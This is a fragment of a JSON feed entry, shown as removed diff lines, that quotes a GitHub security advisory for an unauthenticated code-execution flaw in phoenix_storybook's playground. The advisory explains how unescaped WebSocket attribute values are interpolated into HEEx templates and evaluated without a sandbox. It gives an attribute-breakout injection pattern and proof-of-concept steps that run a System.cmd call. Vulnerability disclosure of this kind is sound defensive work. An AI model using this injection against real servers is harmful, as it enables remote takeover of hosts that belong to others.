-      "summary": "### Summary\nAn unsafe HEEx template generation vulnerability allows any unauthenticated user to execute arbitrary code on the server. The phoenix_storybook playground accepts user-controlled attribute values over WebSocket and interpolates them unsanitized into a HEEx template that is subsequently compiled and evaluated with full Elixir `Kernel` access.\n\n### Details\nThe vulnerability is a three-step chain:\n\n**1. Unsanitized WebSocket input (`extra_assigns_helpers.ex`)**\nThe `psb-assign` event handler in `PhoenixStorybook.Story.PlaygroundPreviewLive` accepts arbitrary attribute names and values from unauthenticated WebSocket clients and  stores them verbatim via `ExtraAssignsHelpers.handle_set_variation_assign/3`.\n\n**2. Unescaped interpolation into HEEx (`component_renderer.ex`)**\n`ComponentRenderer.attributes_markup/1` builds a HEEx template string by interpolating binary attribute values directly:\n```elixir\n{name, val} when is_binary(val) ->\n  ~s|#{name}=\"#{val}\"|\n```\nNo escaping of `\"` or `{` is performed. A value such as `foo\" injected={EXPR} bar=\"` breaks out of the attribute string and injects `EXPR` as an inline HEEx expression.\n\n**3. Unsandboxed evaluation (`component_renderer.ex`)**\nThe resulting HEEx string is compiled via `EEx.compile_string/2` and evaluated via `Code.eval_quoted_with_env/3` with full `Kernel` imports and no sandbox. The injected expression executes on the server even if it causes a rendering error.\n\n### PoC\n1. Identify any story URL with a Playground tab (e.g. `/storybook/core_components/button`).\n2. Connect to the Phoenix LiveView WebSocket without any authentication.\n3. Join the story's LiveView channel and send a `psb-assign` event with an attribute value that escapes the HEEx attribute context and embeds an Elixir expression (e.g. a `System.cmd/2` call).\n4. The server evaluates the injected expression and returns its output in the rendered response.\n\nNo authentication, no special configuration, and no user interaction are required.\n\n#",
-      "link": "https://github.com/advisories/GHSA-55hg-8qxv-qj4p",
-      "published": "2026-06-09T21:58:57Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-8467"
       ],
       "is_zero_day": false,
       "is_high_severity": true
